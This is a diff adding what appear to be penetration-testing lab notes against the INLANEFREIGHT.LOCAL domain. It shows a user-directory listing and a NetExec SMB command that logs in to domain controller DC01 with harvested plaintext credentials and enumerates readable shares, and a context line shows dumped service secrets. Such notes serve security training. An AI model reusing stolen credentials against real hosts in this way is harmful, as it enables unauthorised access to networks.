@@ -1571,3 +1571,40 @@ Secret  : _SC_SQLTELEMETRY$SQLEXPRESS / service 'SQLTELEMETRY$SQLEXPRESS' with u
 
 
 ```
+
+```
+dir c:\users
+ Volume in drive C has no label.
+ Volume Serial Number is DA7F-3F25
+
+ Directory of c:\users
+
+06/01/2022  11:52 AM    <DIR>          .
+06/01/2022  11:52 AM    <DIR>          ..
+06/01/2022  11:03 AM    <DIR>          .NET v2.0
+06/01/2022  11:03 AM    <DIR>          .NET v2.0 Classic
+06/01/2022  11:03 AM    <DIR>          .NET v4.5
+06/01/2022  11:03 AM    <DIR>          .NET v4.5 Classic
+06/01/2022  12:03 PM    <DIR>          Administrator
+06/01/2022  11:03 AM    <DIR>          Classic .NET AppPool
+06/01/2022  10:28 PM    <DIR>          hporter
+06/01/2022  11:54 AM    <DIR>          mpalledorous
+12/14/2020  06:30 PM    <DIR>          Public
+               0 File(s)              0 bytes
+              11 Dir(s)  31,526,375,424 bytes free
+```
+
+```
+nxc smb 172.16.8.3 -u hporter -p Gr8hambino! --shares
+SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\hporter:Gr8hambino! 
+SMB         172.16.8.3      445    DC01             [*] Enumerated shares
+SMB         172.16.8.3      445    DC01             Share           Permissions     Remark
+SMB         172.16.8.3      445    DC01             -----           -----------     ------
+SMB         172.16.8.3      445    DC01             ADMIN$                          Remote Admin
+SMB         172.16.8.3      445    DC01             C$                              Default share
+SMB         172.16.8.3      445    DC01             Department Shares READ            Share for department users
+SMB         172.16.8.3      445    DC01             IPC$            READ            Remote IPC
+SMB         172.16.8.3      445    DC01             NETLOGON        READ            Logon server share 
+SMB         172.16.8.3      445    DC01             SYSVOL          READ            Logon server share
+```
